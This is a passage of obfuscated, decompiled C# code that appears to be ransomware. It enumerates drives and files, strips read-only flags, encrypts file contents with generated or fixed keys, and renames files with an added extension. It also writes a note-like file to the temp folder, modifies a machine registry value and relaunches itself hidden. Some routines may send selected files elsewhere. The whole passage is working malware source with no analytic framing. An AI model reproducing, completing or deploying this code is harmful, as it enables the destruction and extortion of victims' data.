			byte[] bytes = Encoding.ASCII.GetBytes(iWzroveCagNOUOgR(getString_0(107393478)));
			using FileStream fileStream = new FileStream(string_0, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
			fileStream.Write(byte_0, 0, byte_0.Length);
			fileStream.Write(bytes, 0, bytes.Length);
		}
		catch (Exception)
		{
		}
	}

	public static void BNeXBaAUEcD()
	{
		string string_ = bnFgySFPvGNkn(getString_0(107393421));
		try
		{
			RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(iWzroveCagNOUOgR(string_), writable: true);
			if (registryKey != null)
			{
				registryKey.SetValue(iWzroveCagNOUOgR(getString_0(107392860)), 1, RegistryValueKind.DWord);
				registryKey.Close();
			}
		}
		catch
		{
		}
	}

	public static void TwRlPooOVgtl()
	{
		zbzRUHIEDzWaHHIW(getString_0(107397200), iWzroveCagNOUOgR(getString_0(107392795)));
		string text = iWzroveCagNOUOgR(getString_0(107393113));
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.Arguments = getString_0(107393048) + text + getString_0(107393048) + Assembly.GetEntryAssembly()!.Location;
		processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		processStartInfo.CreateNoWindow = true;
		processStartInfo.FileName = getString_0(107397200);
		Process.Start(processStartInfo);
		Environment.Exit(0);
	}

	public static void wVfoevleVV(string string_0)
	{
		try
		{
			FileAttributes attributes = File.GetAttributes(string_0);
			if ((attributes & FileAttributes.ReadOnly) == FileAttributes.ReadOnly)
			{
				File.SetAttributes(string_0, attributes & ~FileAttributes.ReadOnly);
			}
		}
		catch (Exception ex)
		{
			if (ySPgVCqYcWT)
			{
				try
				{
					File.AppendAllText(NarcQCMbbNaqtU, getString_0(107393043) + string_0 + getString_0(107393066) + ex.Message + getString_0(107396661));
					return;
				}
				catch (Exception)
				{
					return;
				}
			}
		}
	}

	public static string sTsovardsxZr()
	{
		OperatingSystem oSVersion = Environment.OSVersion;
		Version version = oSVersion.Version;
		string text = getString_0(107395158);
		if (oSVersion.Platform == PlatformID.Win32Windows)
		{
			switch (version.Minor)
			{
			case 90:
				text = getString_0(107392945);
				break;
			case 10:
				text = ((!(version.Revision.ToString() == getString_0(107393000))) ? getString_0(107392950) : getString_0(107392991));
				break;
			case 0:
				text = getString_0(107392973);
				break;
			}
		}
		else if (oSVersion.Platform == PlatformID.Win32NT)
		{
			switch (version.Major)
			{
			case 3:
				text = getString_0(107392940);
				break;
			case 4:
				text = getString_0(107392959);
				break;
			case 5:
				text = ((version.Minor != 0) ? getString_0(107392909) : getString_0(107392918));
				break;
			case 6:
				text = ((version.Minor != 0) ? ((version.Minor != 1) ? ((version.Minor != 2) ? getString_0(107392885) : getString_0(107392890)) : getString_0(107392927)) : getString_0(107392936));
				break;
			case 10:
				text = getString_0(107392880);
				break;
			}
		}
		if (text != getString_0(107395158))
		{
			text = getString_0(107392907) + text;
			if (oSVersion.ServicePack != getString_0(107395158))
			{
				text = text + getString_0(107392894) + oSVersion.ServicePack;
			}
		}
		return text;
	}

	public static string xoVGYEFeKWSIXC(string string_0)
	{
		string text = Path.GetTempPath() + getString_0(107395339);
		try
		{
			if (!File.Exists(text))
			{
				using StreamWriter streamWriter = new StreamWriter(text);
				streamWriter.WriteLine(iWzroveCagNOUOgR(getString_0(107395306)));
				streamWriter.WriteLine(getString_0(107396661));
				streamWriter.WriteLine(iWzroveCagNOUOgR(getString_0(107395656)));
				streamWriter.WriteLine(string_0);
				if (DiqbXqqefPkiW)
				{
					streamWriter.WriteLine(getString_0(107396661));
					streamWriter.WriteLine(iWzroveCagNOUOgR(getString_0(107395514)));
					streamWriter.WriteLine(vYNZTwVhFOANy.kIGHOBEUhMtWMkFKG());
				}
			}
			else
			{
				string text2 = File.ReadAllText(text);
				if (!text2.Contains(string_0) && !nXPdGXfAViu)
				{
					File.AppendAllText(text, getString_0(107395481) + string_0);
				}
			}
			return text;
		}
		catch (Exception ex)
		{
			if (ySPgVCqYcWT)
			{
				try
				{
					File.AppendAllText(NarcQCMbbNaqtU, getString_0(107392345) + ex.Message + getString_0(107396661));
					return text;
				}
				catch (Exception)
				{
					return text;
				}
			}
			return text;
		}
	}

	private static void PAIjnLkbYxBCcI(string[] string_0, string[] string_1, string[] string_2, string string_3, string string_4)
	{
		doJobctfrcIeix.HmegWMnznQU CS_0024_003C_003E8__locals0 = new doJobctfrcIeix();
		CS_0024_003C_003E8__locals0.FjntbyHzPJWPCXH = string_1;
		CS_0024_003C_003E8__locals0.VWvWknLTtBRqVbqQs = string_2;
		CS_0024_003C_003E8__locals0.nEhqzQMXOdSrVS = string_3;
		CS_0024_003C_003E8__locals0.lrPhBLDcOmetKP = string_4;
		CTCLDhOBQHDRqgI = Encoding.ASCII.GetBytes(CS_0024_003C_003E8__locals0.nEhqzQMXOdSrVS);
		DriveInfo[] array = null;
		if (string_0[0] == getString_0(107396478))
		{
			try
			{
				array = DriveInfo.GetDrives();
			}
			catch (Exception)
			{
			}
			if (array.Length > 0)
			{
				for (int i = 0; i < array.Length; i++)
				{
					if (array[i].IsReady && array[i].DriveType != DriveType.CDRom && !lXkxRPeRNZ.Contains(array[i].Name))
					{
						lXkxRPeRNZ.Add(array[i].Name);
					}
				}
			}
		}
		else
		{
			for (int j = 0; j < string_0.Length; j++)
			{
				if (!lXkxRPeRNZ.Contains(string_0[j]))
				{
					lXkxRPeRNZ.Add(string_0[j]);
				}
			}
		}
		if (lXkxRPeRNZ.Contains(iWzroveCagNOUOgR(getString_0(107392320))) && VMaIlgsPdNUXjXpk == getString_0(107396835))
		{
			lXkxRPeRNZ.Remove(iWzroveCagNOUOgR(getString_0(107392320)));
		}
		Parallel.ForEach(lXkxRPeRNZ, delegate(string string_0)
		{
			CS_0024_003C_003E8__locals0 = new doJobctfrcIeix.HmegWMnznQU();
			CS_0024_003C_003E8__locals0.qcMWOsfsjoEy = CS_0024_003C_003E8__locals0;
			CS_0024_003C_003E8__locals0.vbkvBCZYNpQiYmE = string_0;
			if (wdtSggURCxcnGd && !sTsovardsxZr().Contains(doJobctfrcIeix.getString_0(107392918)))
			{
				Thread thread = new Thread((ThreadStart)delegate
				{
					if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
					{
						QFpuXDgdepZeKeP(WindowsIdentity.GetCurrent().Name, CS_0024_003C_003E8__locals0.vbkvBCZYNpQiYmE);
					}
				});
				thread.Priority = ThreadPriority.Normal;
				thread.IsBackground = true;
				thread.Start();
			}
			if (wqnSIjxqtFtHR == doJobctfrcIeix.getString_0(107396844))
			{
				Thread thread2 = new Thread((ThreadStart)delegate
				{
					nzIsdWkCwoG(CS_0024_003C_003E8__locals0.vbkvBCZYNpQiYmE, CS_0024_003C_003E8__locals0.qcMWOsfsjoEy.FjntbyHzPJWPCXH, CS_0024_003C_003E8__locals0.qcMWOsfsjoEy.lrPhBLDcOmetKP, CS_0024_003C_003E8__locals0.qcMWOsfsjoEy.VWvWknLTtBRqVbqQs, CS_0024_003C_003E8__locals0.qcMWOsfsjoEy.nEhqzQMXOdSrVS);
				});
				thread2.Priority = ThreadPriority.Normal;
				thread2.IsBackground = false;
				thread2.Start();
				thread2.Join();
			}
			else
			{
				nzIsdWkCwoG(CS_0024_003C_003E8__locals0.vbkvBCZYNpQiYmE, CS_0024_003C_003E8__locals0.FjntbyHzPJWPCXH, CS_0024_003C_003E8__locals0.lrPhBLDcOmetKP, CS_0024_003C_003E8__locals0.VWvWknLTtBRqVbqQs, CS_0024_003C_003E8__locals0.nEhqzQMXOdSrVS);
			}
		});
	}

	public static void nzIsdWkCwoG(string string_0, string[] string_1, string string_2, string[] string_3, string string_4)
	{
		List<string> list = new List<string>();
		List<string> list2 = new List<string>();
		list2.Add(getString_0(107395158));
		List<string> list3 = list2;
		if (DxLtCSnkczui == getString_0(107396840))
		{
			list = HrYZRCKDUZYW(string_0, string_1, string_2, string_3, string_4);
			return;
		}
		list = TxPwKaoNbIG.SearchFiles(string_0);
		foreach (string text in string_1)
		{
			foreach (string item in list)
			{
				if (string_3.Length != 0)
				{
					int num = 0;
					while (num < string_3.Length)
					{
						string value = string_3[num];
						if (!item.EndsWith(value))
						{
							num++;
							continue;
						}
						goto IL_039f;
					}
				}
				if ((sbRMnDSlEApwJ == getString_0(107396840) && !item.EndsWith(text)) || wxtQncBrNHcAfj.Contains(item))
				{
					continue;
				}
				if (quvSuKnnGqdfeN == getString_0(107396835))
				{
					try
					{
						if (PZhbxJwZchfW.HalIazfRaZcyQiM(item))
						{
							PZhbxJwZchfW.QfiHOoNTWnv(item);
						}
					}
					catch
					{
					}
				}
				wxtQncBrNHcAfj.Add(item);
				if (!MembHkBRQEG.Contains(Path.GetDirectoryName(item)))
				{
					MembHkBRQEG.Add(Path.GetDirectoryName(item));
				}
				try
				{
					FileStream fileStream = new FileStream(item, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
					if (acYBptnuBPuI == getString_0(107396835) && fileStream.Length > Convert.ToInt32(IaLlphSuwiBhw) * 1024 * 1024 && !list3.Contains(text))
					{
						if (OVQFJzgWysqwhUU == getString_0(107396835))
						{
							foreach (string item2 in PAVedODhIceUP)
							{
								if (item.ToLower().EndsWith(item2) && izFJcfRSIdsTE == getString_0(107396835))
								{
									if (Convert.ToInt32(jXqLQoucvHzVUL) * 1024 * 1024 > fileStream.Length)
									{
										try
										{
											vYNZTwVhFOANy.EZWAhnqPwpiA(getString_0(107394759), getString_0(107394754), getString_0(107394709), item);
										}
										catch
										{
										}
									}
								}
								else if (item.ToLower().EndsWith(item2) && izFJcfRSIdsTE == getString_0(107396840))
								{
									try
									{
										vYNZTwVhFOANy.EZWAhnqPwpiA(getString_0(107394759), getString_0(107394754), getString_0(107394709), item);
									}
									catch
									{
									}
								}
							}
						}
						fileStream.Dispose();
						byte[] byte_ = qiylEdmqkDK.VfCZQwfOAj(item, Convert.ToInt32(IaLlphSuwiBhw) * 1024 * 1024);
						byte[] fgaDtOZgltTEf = qiylEdmqkDK.eqCXDeuOFzjErU(byte_, Encoding.ASCII.GetBytes(string_4), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 });
						qiylEdmqkDK.XLEQJcZPEMiXzygqu(item, fgaDtOZgltTEf);
						if (string_2 != getString_0(107392279))
						{
							File.Move(item, item + string_2);
						}
					}
					else if (string_2 != getString_0(107392279))
					{
						XeYpTlvZyMmWRm(item, item + string_2, CTCLDhOBQHDRqgI);
					}
					else
					{
						XeYpTlvZyMmWRm(item, item + getString_0(107392274), CTCLDhOBQHDRqgI);
					}
				}
				catch (Exception)
				{
				}
				IL_039f:;
			}
		}
	}

	public static void NZnuNjUhxbnPUq(List<string> list_0, string[] string_0, string string_1, string[] string_2, string string_3)
	{
		ZDnnujygFIro.DNVsazavCjDamE CS_0024_003C_003E8__locals0 = new ZDnnujygFIro();
		CS_0024_003C_003E8__locals0.nDEsfoHIbnEr = list_0;
		CS_0024_003C_003E8__locals0.GvpVQWXxwr = string_1;
		CS_0024_003C_003E8__locals0.NIWowDVbTYCA = string_2;
		CS_0024_003C_003E8__locals0.xlYLjVrSvCTxIOZJ = string_3;
		CS_0024_003C_003E8__locals0.UnWzrmFBdFhMI = new List<string> { getString_0(107395158) };
		if (sbRMnDSlEApwJ == getString_0(107396840))
		{
			Parallel.ForEach(string_0, delegate(string string_0)
			{
				foreach (string item in CS_0024_003C_003E8__locals0.nDEsfoHIbnEr)
				{
					if (CS_0024_003C_003E8__locals0.NIWowDVbTYCA.Length != 0)
					{
						string[] nIWowDVbTYCA2 = CS_0024_003C_003E8__locals0.NIWowDVbTYCA;
						int num2 = 0;
						while (num2 < nIWowDVbTYCA2.Length)
						{
							string value2 = nIWowDVbTYCA2[num2];
							if (!item.EndsWith(value2))
							{
								num2++;
								continue;
							}
							goto IL_072e;
						}
					}
					try
					{
						if (item.EndsWith(CS_0024_003C_003E8__locals0.GvpVQWXxwr))
						{
							goto IL_072e;
						}
					}
					catch (Exception)
					{
						goto IL_072e;
					}
					if (item.EndsWith(string_0) && !wxtQncBrNHcAfj.Contains(item))
					{
						if (quvSuKnnGqdfeN == ZDnnujygFIro.getString_0(107396852))
						{
							try
							{
								if (PZhbxJwZchfW.HalIazfRaZcyQiM(item))
								{
									PZhbxJwZchfW.QfiHOoNTWnv(item);
								}
							}
							catch
							{
							}
						}
						wxtQncBrNHcAfj.Add(item);
						if (!MembHkBRQEG.Contains(Path.GetDirectoryName(item)))
						{
							MembHkBRQEG.Add(Path.GetDirectoryName(item));
						}
						wVfoevleVV(item);
						try
						{
							try
							{
								if (new FileInfo(item).Length != 0L)
								{
									goto end_IL_00ee;
								}
								goto end_IL_00ee_2;
								end_IL_00ee:;
							}
							catch (Exception ex12)
							{
								if (ySPgVCqYcWT)
								{
									try
									{
										File.AppendAllText(NarcQCMbbNaqtU, ZDnnujygFIro.getString_0(107393060) + item + ZDnnujygFIro.getString_0(107409725) + ex12.Message + ZDnnujygFIro.getString_0(107396678));
									}
									catch (Exception)
									{
									}
								}
								aZPMuiXAvDSZE++;
								goto end_IL_00ee_2;
							}
							if (acYBptnuBPuI == ZDnnujygFIro.getString_0(107396852) && new FileInfo(item).Length > Convert.ToInt32(IaLlphSuwiBhw) * 1024 * 1024 && !CS_0024_003C_003E8__locals0.UnWzrmFBdFhMI.Contains(string_0))
							{
								CS_0024_003C_003E8__locals0 = new ZDnnujygFIro.POXpVhLAfqOU();
								CS_0024_003C_003E8__locals0.EtWqQmZystJoFY = CS_0024_003C_003E8__locals0;
								try
								{
									if (CS_0024_003C_003E8__locals0.GvpVQWXxwr != ZDnnujygFIro.getString_0(107392296))
									{
										if (DiqbXqqefPkiW)
										{
											CS_0024_003C_003E8__locals0.GvpVQWXxwr = NHtXqRcSpHaMt + CS_0024_003C_003E8__locals0.GvpVQWXxwr;
										}
										File.Move(item, item + CS_0024_003C_003E8__locals0.GvpVQWXxwr);
									}
								}
								catch (Exception ex14)
								{
									if (ySPgVCqYcWT)
									{
										try
										{
											File.AppendAllText(NarcQCMbbNaqtU, ZDnnujygFIro.getString_0(107393060) + item + ZDnnujygFIro.getString_0(107409664) + ex14.Message + ZDnnujygFIro.getString_0(107396678));
										}
										catch (Exception)
										{
										}
									}
									aZPMuiXAvDSZE++;
									goto end_IL_00ee_2;
								}
								CS_0024_003C_003E8__locals0.RgqRyKjBqcnJkTi = ZDnnujygFIro.getString_0(107395175);
								if (CS_0024_003C_003E8__locals0.GvpVQWXxwr != ZDnnujygFIro.getString_0(107392296))
								{
									CS_0024_003C_003E8__locals0.RgqRyKjBqcnJkTi = item + CS_0024_003C_003E8__locals0.GvpVQWXxwr;
								}
								else
								{
									CS_0024_003C_003E8__locals0.RgqRyKjBqcnJkTi = item;
								}
								if (OVQFJzgWysqwhUU == ZDnnujygFIro.getString_0(107396852))
								{
									Thread thread2 = new Thread((ThreadStart)delegate
									{
										foreach (string item2 in PAVedODhIceUP)
										{
											if (CS_0024_003C_003E8__locals0.RgqRyKjBqcnJkTi.ToLower().EndsWith(item2 + CS_0024_003C_003E8__locals0.EtWqQmZystJoFY.GvpVQWXxwr) && izFJcfRSIdsTE == ZDnnujygFIro.POXpVhLAfqOU.getString_0(107396855))
											{
												if (Convert.ToInt32(jXqLQoucvHzVUL) * 1024 * 1024 > new FileInfo(CS_0024_003C_003E8__locals0.RgqRyKjBqcnJkTi).Length)
												{
													try
													{
														vYNZTwVhFOANy.EZWAhnqPwpiA(ZDnnujygFIro.POXpVhLAfqOU.getString_0(107394779), ZDnnujygFIro.POXpVhLAfqOU.getString_0(107394774), ZDnnujygFIro.POXpVhLAfqOU.getString_0(107394729), CS_0024_003C_003E8__locals0.RgqRyKjBqcnJkTi);
													}
													catch
													{
													}
												}
											}
											else if (CS_0024_003C_003E8__locals0.RgqRyKjBqcnJkTi.ToLower().EndsWith(item2) && izFJcfRSIdsTE == ZDnnujygFIro.POXpVhLAfqOU.getString_0(107396860))
											{
												try
												{
													vYNZTwVhFOANy.EZWAhnqPwpiA(ZDnnujygFIro.POXpVhLAfqOU.getString_0(107394779), ZDnnujygFIro.POXpVhLAfqOU.getString_0(107394774), ZDnnujygFIro.POXpVhLAfqOU.getString_0(107394729), CS_0024_003C_003E8__locals0.RgqRyKjBqcnJkTi);
												}
												catch
												{
												}
											}
										}
									});
									thread2.Priority = ThreadPriority.Normal;
									thread2.IsBackground = false;
									thread2.Start();
								}
								string text3 = UtAmjQduUxhP.JxvEpXggtdJEmYY(32);
								string s3 = BAWbbIGcEbbh.BsLVCxQmQh(text3);
								byte[] bytes3 = Encoding.ASCII.GetBytes(s3);
								byte[] array2 = null;
								byte[] byte_2 = qiylEdmqkDK.VfCZQwfOAj(CS_0024_003C_003E8__locals0.RgqRyKjBqcnJkTi, Convert.ToInt32(IaLlphSuwiBhw) * 1024 * 1024);
								qiylEdmqkDK.XLEQJcZPEMiXzygqu(FgaDtOZgltTEf: (!mvEARGpSInJD) ? (nXPdGXfAViu ? qiylEdmqkDK.eqCXDeuOFzjErU(byte_2, Encoding.ASCII.GetBytes(text3), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : qiylEdmqkDK.eqCXDeuOFzjErU(byte_2, Encoding.ASCII.GetBytes(CS_0024_003C_003E8__locals0.xlYLjVrSvCTxIOZJ), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })) : (nXPdGXfAViu ? uSVNzpcBrR.YOpbVsOnwFaxe(byte_2, Encoding.ASCII.GetBytes(text3), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : uSVNzpcBrR.YOpbVsOnwFaxe(byte_2, Encoding.ASCII.GetBytes(CS_0024_003C_003E8__locals0.xlYLjVrSvCTxIOZJ), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })), idTFLyQZiFgNR: CS_0024_003C_003E8__locals0.RgqRyKjBqcnJkTi, eCvmaKFbLrK: bytes3);
							}
							else
							{
								if (DiqbXqqefPkiW)
								{
									CS_0024_003C_003E8__locals0.GvpVQWXxwr = NHtXqRcSpHaMt + CS_0024_003C_003E8__locals0.GvpVQWXxwr;
								}
								string text4 = UtAmjQduUxhP.JxvEpXggtdJEmYY(32);
								string s4 = BAWbbIGcEbbh.BsLVCxQmQh(text4);
								byte[] bytes4 = Encoding.ASCII.GetBytes(s4);
								if (CS_0024_003C_003E8__locals0.GvpVQWXxwr != ZDnnujygFIro.getString_0(107392296))
								{
									if (!krgzddxGYNU)
									{
										if (!nXPdGXfAViu)
										{
											TPDGCdwrJXWli(item, item + CS_0024_003C_003E8__locals0.GvpVQWXxwr, CTCLDhOBQHDRqgI);
										}
										else
										{
											TPDGCdwrJXWli(item, item + CS_0024_003C_003E8__locals0.GvpVQWXxwr, Encoding.ASCII.GetBytes(text4));
										}
									}
									else
									{
										try
										{
											if (!nXPdGXfAViu)
											{
												OCFRJwPDGkuTGlhs(item, item + CS_0024_003C_003E8__locals0.GvpVQWXxwr, CTCLDhOBQHDRqgI);
											}
											else
											{
												OCFRJwPDGkuTGlhs(item, item + CS_0024_003C_003E8__locals0.GvpVQWXxwr, Encoding.ASCII.GetBytes(text4));
											}
										}
										catch (Exception ex16)
										{
											if (ySPgVCqYcWT)
											{
												try
												{
													File.AppendAllText(NarcQCMbbNaqtU, ZDnnujygFIro.getString_0(107393060) + item + ZDnnujygFIro.getString_0(107392314) + ex16.Message + ZDnnujygFIro.getString_0(107396678));
												}
												catch (Exception)
												{
												}
											}
											aZPMuiXAvDSZE++;
											goto end_IL_00ee_2;
										}
									}
								}
								else if (!krgzddxGYNU)
								{
									if (!nXPdGXfAViu)
									{
										TPDGCdwrJXWli(item, item + ZDnnujygFIro.getString_0(107392291), CTCLDhOBQHDRqgI);
									}
									else
									{
										TPDGCdwrJXWli(item, item + ZDnnujygFIro.getString_0(107392291), Encoding.ASCII.GetBytes(text4));
									}
								}
								else
								{
									try
									{
										if (!nXPdGXfAViu)
										{
											OCFRJwPDGkuTGlhs(item, item, CTCLDhOBQHDRqgI);
										}
										else
										{
											OCFRJwPDGkuTGlhs(item, item, Encoding.ASCII.GetBytes(text4));
										}
									}
									catch (Exception ex18)
									{
										if (ySPgVCqYcWT)
										{
											try
											{
												File.AppendAllText(NarcQCMbbNaqtU, ZDnnujygFIro.getString_0(107393060) + item + ZDnnujygFIro.getString_0(107392314) + ex18.Message + ZDnnujygFIro.getString_0(107396678));
											}
											catch (Exception)
											{
											}
										}
										aZPMuiXAvDSZE++;
										goto end_IL_00ee_2;
									}
								}
								if (nXPdGXfAViu)
								{
									if (CS_0024_003C_003E8__locals0.GvpVQWXxwr != ZDnnujygFIro.getString_0(107392296))
									{
										qJuIVZQcNrI(item + CS_0024_003C_003E8__locals0.GvpVQWXxwr, bytes4);
									}
									else
									{
										qJuIVZQcNrI(item, bytes4);
									}
								}
							}
							goto IL_072e;
							end_IL_00ee_2:;
						}
						catch (Exception)
						{
							goto IL_072e;
						}
					}
					continue;
					IL_072e:
					CS_0024_003C_003E8__locals0.nDEsfoHIbnEr.Remove(item);
				}
			});
			return;
		}
		Parallel.ForEach(CS_0024_003C_003E8__locals0.nDEsfoHIbnEr, delegate(string string_0)
		{
			CS_0024_003C_003E8__locals0 = new ZDnnujygFIro.DNVsazavCjDamE();
			CS_0024_003C_003E8__locals0.EtWqQmZystJoFY = CS_0024_003C_003E8__locals0;
			CS_0024_003C_003E8__locals0.zludOANeWNA = string_0;
			if (CS_0024_003C_003E8__locals0.NIWowDVbTYCA.Length != 0)
			{
				string[] nIWowDVbTYCA = CS_0024_003C_003E8__locals0.NIWowDVbTYCA;
				int num = 0;
				while (num < nIWowDVbTYCA.Length)
				{
					string value = nIWowDVbTYCA[num];
					if (!CS_0024_003C_003E8__locals0.zludOANeWNA.EndsWith(value))
					{
						num++;
						continue;
					}
					goto IL_07bb;
				}
			}
			try
			{
				if (CS_0024_003C_003E8__locals0.zludOANeWNA.EndsWith(CS_0024_003C_003E8__locals0.GvpVQWXxwr))
				{
					goto IL_07bb;
				}
			}
			catch (Exception)
			{
				goto IL_07bb;
			}
			if (!wxtQncBrNHcAfj.Contains(CS_0024_003C_003E8__locals0.zludOANeWNA))
			{
				if (quvSuKnnGqdfeN == ZDnnujygFIro.getString_0(107396852))
				{
					try
					{
						if (PZhbxJwZchfW.HalIazfRaZcyQiM(CS_0024_003C_003E8__locals0.zludOANeWNA))
						{
							PZhbxJwZchfW.QfiHOoNTWnv(CS_0024_003C_003E8__locals0.zludOANeWNA);
						}
					}
					catch
					{
					}
				}
				wxtQncBrNHcAfj.Add(CS_0024_003C_003E8__locals0.zludOANeWNA);
				if (!MembHkBRQEG.Contains(Path.GetDirectoryName(CS_0024_003C_003E8__locals0.zludOANeWNA)))
				{
					MembHkBRQEG.Add(Path.GetDirectoryName(CS_0024_003C_003E8__locals0.zludOANeWNA));
				}
				wVfoevleVV(CS_0024_003C_003E8__locals0.zludOANeWNA);
				try
				{
					try
					{
						if (new FileInfo(CS_0024_003C_003E8__locals0.zludOANeWNA).Length != 0L)
						{
							goto end_IL_0117;
						}
						goto end_IL_0117_2;
						end_IL_0117:;
					}
					catch (Exception ex2)
					{
						if (ySPgVCqYcWT)
						{
							try
							{
								File.AppendAllText(NarcQCMbbNaqtU, ZDnnujygFIro.getString_0(107393060) + CS_0024_003C_003E8__locals0.zludOANeWNA + ZDnnujygFIro.getString_0(107409725) + ex2.Message + ZDnnujygFIro.getString_0(107396678));
							}
							catch (Exception)
							{
							}
						}
						aZPMuiXAvDSZE++;
						goto end_IL_0117_2;
					}
					if (acYBptnuBPuI == ZDnnujygFIro.getString_0(107396852) && new FileInfo(CS_0024_003C_003E8__locals0.zludOANeWNA).Length > Convert.ToInt32(IaLlphSuwiBhw) * 1024 * 1024)
					{
						try
						{
							if (CS_0024_003C_003E8__locals0.GvpVQWXxwr != ZDnnujygFIro.getString_0(107392296))
							{
								if (DiqbXqqefPkiW)
								{
									CS_0024_003C_003E8__locals0.GvpVQWXxwr = NHtXqRcSpHaMt + CS_0024_003C_003E8__locals0.GvpVQWXxwr;
								}
								File.Move(CS_0024_003C_003E8__locals0.zludOANeWNA, CS_0024_003C_003E8__locals0.zludOANeWNA + CS_0024_003C_003E8__locals0.GvpVQWXxwr);
							}
						}
						catch (Exception ex4)
						{
							if (ySPgVCqYcWT)
							{
								try
								{
									File.AppendAllText(NarcQCMbbNaqtU, ZDnnujygFIro.getString_0(107393060) + CS_0024_003C_003E8__locals0.zludOANeWNA + ZDnnujygFIro.getString_0(107409664) + ex4.Message + ZDnnujygFIro.getString_0(107396678));
								}
								catch (Exception)
								{
								}
							}
							aZPMuiXAvDSZE++;
							return;
						}
						if (CS_0024_003C_003E8__locals0.GvpVQWXxwr != ZDnnujygFIro.getString_0(107392296))
						{
							CS_0024_003C_003E8__locals0.zludOANeWNA += CS_0024_003C_003E8__locals0.GvpVQWXxwr;
						}
						if (OVQFJzgWysqwhUU == ZDnnujygFIro.getString_0(107396852))
						{
							Thread thread = new Thread((ThreadStart)delegate
							{
								foreach (string item3 in PAVedODhIceUP)
								{
									if (CS_0024_003C_003E8__locals0.zludOANeWNA.ToLower().EndsWith(item3 + CS_0024_003C_003E8__locals0.EtWqQmZystJoFY.GvpVQWXxwr) && izFJcfRSIdsTE == ZDnnujygFIro.DNVsazavCjDamE.getString_0(107396858))
									{
										if (Convert.ToInt32(jXqLQoucvHzVUL) * 1024 * 1024 > new FileInfo(CS_0024_003C_003E8__locals0.zludOANeWNA).Length)
										{
											try
											{
												vYNZTwVhFOANy.EZWAhnqPwpiA(ZDnnujygFIro.DNVsazavCjDamE.getString_0(107394782), ZDnnujygFIro.DNVsazavCjDamE.getString_0(107394777), ZDnnujygFIro.DNVsazavCjDamE.getString_0(107394732), CS_0024_003C_003E8__locals0.zludOANeWNA);
											}
											catch
											{
											}
										}
									}
									else if (CS_0024_003C_003E8__locals0.zludOANeWNA.ToLower().EndsWith(item3) && izFJcfRSIdsTE == ZDnnujygFIro.DNVsazavCjDamE.getString_0(107396863))
									{
										try
										{
											vYNZTwVhFOANy.EZWAhnqPwpiA(ZDnnujygFIro.DNVsazavCjDamE.getString_0(107394782), ZDnnujygFIro.DNVsazavCjDamE.getString_0(107394777), ZDnnujygFIro.DNVsazavCjDamE.getString_0(107394732), CS_0024_003C_003E8__locals0.zludOANeWNA);
										}
										catch
										{
										}
									}
								}
							});
							thread.IsBackground = false;
							thread.Priority = ThreadPriority.Normal;
							thread.Start();
						}
						string text = UtAmjQduUxhP.JxvEpXggtdJEmYY(32);
						string s = BAWbbIGcEbbh.BsLVCxQmQh(text);
						byte[] bytes = Encoding.ASCII.GetBytes(s);
						byte[] array = null;
						byte[] byte_ = qiylEdmqkDK.VfCZQwfOAj(CS_0024_003C_003E8__locals0.zludOANeWNA, Convert.ToInt32(IaLlphSuwiBhw) * 1024 * 1024);
						qiylEdmqkDK.XLEQJcZPEMiXzygqu(FgaDtOZgltTEf: (!mvEARGpSInJD) ? (nXPdGXfAViu ? qiylEdmqkDK.eqCXDeuOFzjErU(byte_, Encoding.ASCII.GetBytes(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : qiylEdmqkDK.eqCXDeuOFzjErU(byte_, Encoding.ASCII.GetBytes(CS_0024_003C_003E8__locals0.xlYLjVrSvCTxIOZJ), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })) : (nXPdGXfAViu ? uSVNzpcBrR.YOpbVsOnwFaxe(byte_, Encoding.ASCII.GetBytes(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : uSVNzpcBrR.YOpbVsOnwFaxe(byte_, Encoding.ASCII.GetBytes(CS_0024_003C_003E8__locals0.xlYLjVrSvCTxIOZJ), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })), idTFLyQZiFgNR: CS_0024_003C_003E8__locals0.zludOANeWNA, eCvmaKFbLrK: bytes);
					}
					else
					{
						if (DiqbXqqefPkiW)
						{
							CS_0024_003C_003E8__locals0.GvpVQWXxwr = NHtXqRcSpHaMt + CS_0024_003C_003E8__locals0.GvpVQWXxwr;
						}
						string text2 = UtAmjQduUxhP.JxvEpXggtdJEmYY(32);
						string s2 = BAWbbIGcEbbh.BsLVCxQmQh(text2);
						byte[] bytes2 = Encoding.ASCII.GetBytes(s2);
						if (CS_0024_003C_003E8__locals0.GvpVQWXxwr != ZDnnujygFIro.getString_0(107392296))
						{
							if (!krgzddxGYNU)
							{
								if (!nXPdGXfAViu)
								{
									TPDGCdwrJXWli(CS_0024_003C_003E8__locals0.zludOANeWNA, CS_0024_003C_003E8__locals0.zludOANeWNA + CS_0024_003C_003E8__locals0.GvpVQWXxwr, CTCLDhOBQHDRqgI);
								}
								else
								{
									TPDGCdwrJXWli(CS_0024_003C_003E8__locals0.zludOANeWNA, CS_0024_003C_003E8__locals0.zludOANeWNA + CS_0024_003C_003E8__locals0.GvpVQWXxwr, Encoding.ASCII.GetBytes(text2));
								}
							}
							else
							{
								try
								{
									if (!nXPdGXfAViu)
									{
										OCFRJwPDGkuTGlhs(CS_0024_003C_003E8__locals0.zludOANeWNA, CS_0024_003C_003E8__locals0.zludOANeWNA + CS_0024_003C_003E8__locals0.GvpVQWXxwr, CTCLDhOBQHDRqgI);
									}
									else
									{
										OCFRJwPDGkuTGlhs(CS_0024_003C_003E8__locals0.zludOANeWNA, CS_0024_003C_003E8__locals0.zludOANeWNA + CS_0024_003C_003E8__locals0.GvpVQWXxwr, Encoding.ASCII.GetBytes(text2));
									}
								}
								catch (Exception ex6)
								{
									if (ySPgVCqYcWT)
									{
										try
										{
